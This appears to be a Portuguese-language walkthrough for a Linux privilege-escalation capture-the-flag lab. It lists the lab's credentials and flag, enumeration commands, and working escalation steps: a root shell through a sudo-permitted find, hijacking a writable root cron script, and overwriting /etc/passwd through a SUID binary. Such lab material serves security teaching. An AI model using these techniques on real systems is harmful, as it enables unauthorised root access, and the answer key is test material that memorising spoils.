# privesc — Escalação de privilégio no Linux (Média)

Você entra por SSH como o usuário `dev` e precisa virar `root` para ler
`/root/flag.txt`.

## Flag
- `CYBERLAB{pr1v3sc_l1nux}` — em `/root/flag.txt`

## Acesso inicial
```bash
ssh dev@IP        # senha: dev123
id                # uid=1000(dev)
cat /home/dev/notes.txt   # pista: "admin / S3nh4D0Banco"
```

## 1) Enumeração de privesc (checklist)
```bash
sudo -l
find / -perm -4000 2>/dev/null      # SUID
cat /etc/crontab; ls /etc/crontabs/
ls -la /home/dev                    # permissões suspeitas
```

## 2) Via sudo mal configurado
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find

sudo find . -exec /bin/sh -p \; -quit
id            # -> uid=0(root)
cat /root/flag.txt
```

## 3) Via cron com script gravável
O root roda `/home/dev/backup.sh` a cada minuto, e o arquivo é editável por `dev`:
```bash
echo 'cat /root/flag.txt > /tmp/flag.txt' > /home/dev/backup.sh
sleep 65
cat /tmp/flag.txt      # -> flag
```
(ou faça a job gerar um reverse shell de volta pro atacante.)

## 4) Via SUID (binários)
Se houver um binário SUID root (ex.: `cp`), use-o para sobrescrever `/etc/passwd`
com um usuário root de sua escolha — técnica clássica de privesc.

## Caminho lógico
```
SSH (senha fraca) -> enumeração (sudo -l / find SUID / cron) -> escalar -> /root/flag.txt
```